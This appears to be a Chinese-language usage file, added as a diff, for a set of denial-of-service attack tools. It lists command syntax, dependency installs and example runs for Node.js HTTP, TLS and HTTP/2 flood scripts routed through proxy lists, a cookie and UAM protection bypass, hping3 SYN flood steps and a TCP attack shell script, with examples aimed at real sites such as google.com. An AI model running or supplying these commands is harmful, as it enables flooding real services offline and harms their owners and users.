@@ -1,0 +1,91 @@
+
+node cc.js 目标 porxy.txt 时间
+
+--------------------------------------------------------------------------
+
+命令：
+node bypass.js <目标> <时间> <速率> <线程> <代理文件>
+
+示例：
+node bypass.js https://google.com 60 128 50 proxy.txt
+
+安装：
+npm install net http2 tls cluster url crypto fs axios cheerio gradient-string 
+------------------------------------------------------------------------------------------
+
+命令：
+node TLS.js <目标> <时间> <速率> <线程> <代理List>
+
+示例：
+node TLS.js https://google.com 60 64 5 proxy.txt
+
+安装：
+npm install net http2 tls cluster url path crypto user-agents fs header-generator axios
+
+---------------------------------------------------------------------------------------------------
+命令：
+node tls.js <目标> <时间> <请求> <线程> <代理文件>
+
+示例：
+node tls.js https://google.com 60 128 5 proxy.txt
+
+安装：
+npm install net http2 tls cluster url crypto user-agents fs
+---------------------------------------------------------------------------------------------------
+
+绕过 Cookie、Uam…
+
+命令：
+node test.js <目标> <时间> <线程> <请求> <代理文件>
+
+示例：
+node test.js https://google.com 60 5 128 proxy.txt
+
+安装：
+npm install url fs http2 http tls net request cluster fake-useragent randomstring
+---------------------------------------------------------------------------------------------------
+命令：
+node HTTP2.js <目标> <时间> <线程> <速率> <代理文件>
+
+示例：
+node HTTP2.js https://google.com 60 5 64 proxy.txt
+
+安装：
+npm install crypto fs url cluster http2 tls colors net
+---------------------------------------------------------------------------------------------------
+
+国内伪造SYN步骤
+1:安装hping3
+命令:apt-get install -y hping3
+2:创建一个目录
+命令:mkdir s&&cd s
+3:攻击
+./syn 2 IP 端口 时间 包大小
+(大包520以上-1400，小包128-520)
+---------------------------------------------------------------------------------------------------
+# 一款TCP攻击脚本 来源网络转载
+# 安装node环境等模块
+# 使用方法:
+# chmod 777 tcp.sh
+# ./tcp.sh 127.0.0.1 80 60
+# ./tcp.sh 目标ip 目标端口 攻击时间
+# 默认50线程 如果需要更高线程自己更改sh文件
+# 默认采用代理列表文件proxies.txt 也可以自己更改成proxy.txt
+---------------------------------------------------------------------------------------------------
+CC脚本
+高洪水proxy_http3攻击脚本
+node proxy_http3.js <target> <threads> <proxyfile> <time> <rps> <amp> <randomStringLength>
+<target> 是目标URL。
+<threads> 是要启动的线程数量。
+<proxyfile> 是包含代理列表的文件路径。
+<time> 是脚本运行的时间（以秒为单位）。
+<rps> 是每秒请求数。
+<amp> 是请求头重复次数。
+<randomStringLength> 是生成随机字符串的长度。
+列如：node script.js http://example.com 10 proxies.txt 60 100 5 8
+或是  node http2.js https://layer7.wiki?xiao. 85 proxy.txt 360 20 20 &
+
+
+
+
+
